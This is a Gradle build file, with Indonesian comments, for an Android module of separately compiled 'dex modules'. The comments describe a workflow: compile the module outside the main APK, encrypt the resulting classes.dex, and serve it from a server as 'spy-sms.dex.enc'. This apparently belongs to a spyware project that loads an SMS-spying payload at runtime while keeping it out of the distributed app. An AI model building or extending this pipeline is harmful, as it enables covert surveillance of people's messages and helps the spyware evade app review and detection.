plugins {
    id 'com.android.library'
    id 'org.jetbrains.kotlin.android'
}

// Dex modules — dikompile TERPISAH dari APK utama.
// Output .dex dienkripsi dengan scripts/encrypt-dex.js lalu di-serve server.
// JANGAN include modul ini sebagai dependency di android/app/build.gradle!
//
// Build:
//   cd android && ./gradlew :dex-modules:bundleReleaseAar
//   unzip dex-modules/build/outputs/aar/dex-modules-release.aar classes.dex -d /tmp/
//   node scripts/encrypt-dex.js /tmp/classes.dex public/modules/spy-sms.dex.enc

android {
    namespace 'com.android.modules'
    compileSdk 34
    defaultConfig { minSdk 26; targetSdk 34 }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = '17' }
}

dependencies {
    implementation 'androidx.core:core-ktx:1.12.0'
}
